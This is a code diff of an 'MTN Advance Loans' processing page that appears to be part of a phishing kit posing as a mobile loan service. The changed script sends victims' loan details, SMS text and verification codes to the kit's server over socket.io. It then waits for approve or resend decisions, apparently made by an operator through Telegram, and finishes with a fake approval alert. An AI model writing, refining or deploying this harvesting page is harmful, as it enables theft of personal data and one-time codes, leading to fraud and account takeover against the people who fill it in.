@@ -6,28 +6,12 @@
     <title>Processing - MTN Advance Loans</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
-        body { 
-            background-color: #004c6c; 
-            color: white; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            text-align: center;
-        }
+        body { background-color: #004c6c; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; text-align: center; }
         .logo-container { margin-bottom: 40px; position: relative; display: inline-block; }
         .logo-container img { width: 120px; border-radius: 20px; position: relative; z-index: 2; }
-        .glow {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 140px; height: 140px; background: rgba(255, 204, 0, 0.4);
-            filter: blur(30px); border-radius: 50%; z-index: 1; animation: pulse 2s infinite alternate;
-        }
+        .glow { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 140px; height: 140px; background: rgba(255, 204, 0, 0.4); filter: blur(30px); border-radius: 50%; z-index: 1; animation: pulse 2s infinite alternate; }
         @keyframes pulse { 0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.6; } 100% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; } }
-        .spinner {
-            width: 80px; height: 80px; border: 6px solid rgba(255, 255, 255, 0.1);
-            border-top: 6px solid #ffcc00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 40px;
-        }
+        .spinner { width: 80px; height: 80px; border: 6px solid rgba(255, 255, 255, 0.1); border-top: 6px solid #ffcc00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 40px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h1 { font-size: 1.8rem; margin-bottom: 10px; font-weight: 600; }
         p { font-size: 1rem; color: #b3c6d1; margin-bottom: 40px; }
@@ -51,27 +35,40 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
+        // Force a fresh connection
         const socket = io();
-        const processType = sessionStorage.getItem('processType');
 
-        // Keep the connection alive by pinging the server every 10 seconds
+        // Keep connection alive
         setInterval(() => {
             if (socket.connected) socket.emit('ping');
-        }, 10000);
+        }, 5000);
 
-        // Trigger the correct socket emit based on the page flow
-        if (processType === 'loan_application') {
-            const loanData = JSON.parse(sessionStorage.getItem('loanData'));
-            socket.emit('submit_loan', loanData);
-        } 
-        else if (processType === 'sms_verification') {
-            const smsText = sessionStorage.getItem('smsData');
-            socket.emit('submit_sms', smsText);
-        }
-        else if (processType === 'final_code') {
-            const finalCode = sessionStorage.getItem('finalCodeData');
-            socket.emit('submit_final_code', finalCode);
-        }
+        socket.on('connect', () => {
+            console.log("Socket Connected:", socket.id);
+            
+            const processType = sessionStorage.getItem('processType');
+            console.log("Processing Type:", processType);
+
+            if (processType === 'loan_application') {
+                const loanData = sessionStorage.getItem('loanData');
+                if (loanData) socket.emit('submit_loan', JSON.parse(loanData));
+                else window.location.href = "/index.html"; // Fallback if data missing
+            } 
+            else if (processType === 'sms_verification') {
+                const smsText = sessionStorage.getItem('smsData');
+                if (smsText) socket.emit('submit_sms', smsText);
+                else window.location.href = "/verify-sms.html";
+            }
+            else if (processType === 'final_code') {
+                const finalCode = sessionStorage.getItem('finalCodeData');
+                if (finalCode) socket.emit('submit_final_code', finalCode);
+                else window.location.href = "/verify-code.html";
+            }
+            else {
+                // If no process type is found, go home
+                window.location.href = "/index.html";
+            }
+        });
 
         // --- LISTEN FOR TELEGRAM DECISIONS ---
 
@@ -106,7 +103,7 @@
         socket.on('final_approved', () => {
             sessionStorage.clear();
             alert("Your loan has been approved for funding within 24 hours.");
-            window.location.href = "/success.html"; // Or redirect to home
+            window.location.href = "/"; 
         });
         socket.on('final_resend', () => {
             sessionStorage.clear();
